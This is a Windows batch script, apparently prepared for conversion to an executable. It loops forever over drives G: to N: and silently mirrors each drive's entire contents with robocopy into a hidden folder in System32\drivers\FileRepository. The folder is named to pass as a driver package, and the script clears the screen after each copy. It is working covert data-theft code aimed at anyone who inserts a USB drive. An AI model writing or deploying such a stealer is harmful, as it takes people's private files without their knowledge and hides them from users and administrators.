::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCiDJEuH9kcMe00EAg2BMws=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJiZks0
::ZQ05rAF9IBncCkqN+0xwdVsGAlTi
::ZQ05rAF9IAHYFVzEqQIlOxkZXguAM2i1FqwZ+tf59qeMrU8YX+0rd+8=
::eg0/rx1wNQPfEVWB+kM9LVsJDBGRPiaoCbcT6+fr9u+VnU8EGekweorQ1aCBbuUL7yU=
::fBEirQZwNQPfEVWB+kM9LVsJDBGRPiaoCbcT6+fr9u+VnU8EGekweorQ1aCBQA==
::cRolqwZ3JBvQF1fEqQImLQkUHkrSfGmjRr4T6u225OWTrQ1bFNY6dZ/eyaDu
::dhA7uBVwLU+EWFKL9kd9IxRAQ0TEfF+/C6UZ+/yb
::YQ03rBFzNR3SWATE/00yLVZfQxCNfC36MrAR+O3o+4o=
::dhAmsQZ3MwfNWATE100gMQldSwyWfDnqVORc4+f56qeMrVkSFKR/TIrWyrGdNIA=
::ZQ0/vhVqMQ3MEVWAtB9wPh5GDFbMbCu4H/UX5+r+ouGItkJ9
::Zg8zqx1/OA3MEVWAtB9wPh5GDFbMbCu4H/UX5+r+ouGItkJ9
::dhA7pRFwIByZRRmS8VBwelUEDAabfGC1BLBR4+fv4Io=
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy++UqVkSRN4qa42WyLuML+Mc+lzhZ6kvzzdRl8kJBxRMcS35Ohk1vTsM5iqAL8L8
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

::path set
set voll=C
set patt=Windows\System32\drivers\FileRepository
set first=ucrb_kobekoto_
set last=.inf_x86_neutral_978f6d2a14a93zn7cc963da21a135fa983
set waittime=1
set vol1=G
set vol2=H
set vol3=I
set vol4=J
set vol5=K
set vol6=L
set vol7=M
set vol8=N
set p=tempvalue
::set done

:ucrbbykoto

for /f "delims=" %%i in ('vol %vol1%:') do set p=%%i
IF NOT EXIST "%vol1%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol1%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims= " %%i in ('vol %vol2%:') do set p=%%i
IF NOT EXIST "%vol2%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol2%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims=" %%i in ('vol %vol3%:') do set p=%%i
IF NOT EXIST "%vol3%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol3%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims=" %%i in ('vol %vol4%:') do set p=%%i
IF NOT EXIST "%vol4%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol4%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims=" %%i in ('vol %vol5%:') do set p=%%i
IF NOT EXIST "%vol5%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol5%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims=" %%i in ('vol %vol6%:') do set p=%%i
IF NOT EXIST "%vol6%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol6%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims=" %%i in ('vol %vol7%:') do set p=%%i
IF NOT EXIST "%vol7%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol7%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

for /f "delims=" %%i in ('vol %vol8%:') do set p=%%i
IF NOT EXIST "%vol8%:\%patt%\%first%%p:~-9%%last%\.notcopy" robocopy %vol8%:\ %voll%:\%patt%\%first%%p:~-9%%last%\ /MIR /e /W:0 /R:0
choice /d y /t %waittime% >nul
cls

goto ucrbbykoto
